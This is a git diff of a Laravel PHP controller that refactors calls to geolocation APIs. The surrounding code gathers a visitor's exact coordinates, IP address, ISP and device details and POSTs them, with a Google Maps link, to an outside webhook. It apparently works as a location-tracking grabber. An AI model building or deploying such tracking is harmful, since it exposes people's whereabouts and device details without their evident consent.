@@ -10,6 +10,19 @@ use Illuminate\Validation\ValidationException;
 
 class ServiceAPIController extends Controller
 {
+
+    private function callMapApi($url)
+    {
+        // Inisialisasi Client Guzzle
+        $client = new Client();
+        $api = $client->request('GET', $url, [
+            'headers' => [
+                'User-Agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_6; like Mac OS X) AppleWebKit/600.11 (KHTML, like Gecko)  Chrome/53.0.1036.219 Mobile Safari/600.6'
+            ]
+        ]);
+        return json_decode($api->getBody(), true);
+    }
+
     public function getCity(Request $request)
     {
         // Validasi input lat dan long
@@ -19,21 +32,14 @@ class ServiceAPIController extends Controller
             'ip' => 'required|ip',
         ]);
 
-        // Inisialisasi Client Guzzle
-        $client = new Client();
 
         try {
-            // Request ke API ip-api
+            $client = new Client();
             $api = $client->request('GET', 'http://ip-api.com/json/' . $validatedData['ip']);
             $json = json_decode($api->getBody(), true);
             $apilokasi = 'https://nominatim.openstreetmap.org/reverse?lat=' . $validatedData['lat'] . '&lon=' . $validatedData['long'] . '&format=json&accept-language=id';
-            // dd($apilokasi);
-            $city = $client->request('GET', $apilokasi, [
-                'headers' => [
-                    'User-Agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_6; like Mac OS X) AppleWebKit/600.11 (KHTML, like Gecko)  Chrome/53.0.1036.219 Mobile Safari/600.6'
-                ]
-            ]);
-            $json2 = json_decode($city->getBody(), true);
+
+            $city = $this->callMapApi($apilokasi);
 
             $response = $client->request('POST', 'https://apiv2.bhadrikais.my.id/webhook.php?kode=2', [
                 'headers' => [
@@ -44,7 +50,7 @@ class ServiceAPIController extends Controller
                     'message' =>  "LINK :\n" . $request->url() . "\n" .
                         "LOKASI :\n " . 'https://www.google.com/maps/search/?api=1&query=' . $validatedData['lat'] . ',' . $validatedData['long'] . " \n" .
                         "IP :\n" . $json['query'] . "\n" .
-                        "KOTA :\n" . $json2['address']['city'] . "\n" .
+                        "KOTA :\n" . $city['address']['city'] . "\n" .
                         "ISP :\n" . $json['isp'] . "\n" .
                         "DEVICE :\n" . $request->header('User-Agent'),
                 ]
@@ -52,7 +58,7 @@ class ServiceAPIController extends Controller
 
             return response()->json([
                 'status' => 200,
-                'data' => $json2['address']['city']
+                'data' => $city['address']['city']
             ]);
         } catch (\Exception $e) {
             // Jika terjadi error, tangani dan kirim error message
@@ -96,5 +102,12 @@ class ServiceAPIController extends Controller
                 'error' => $e->getMessage()
             ]);
         }
+    }
+
+    public function checkCity(String $city)
+    {
+        $url = $this->callMapApi('https://nominatim.openstreetmap.org/search?city=' . $city . '&country=Indonesia&format=json&limit=1');
+
+        return $url[0]['addresstype'] === 'city';
     }
 }
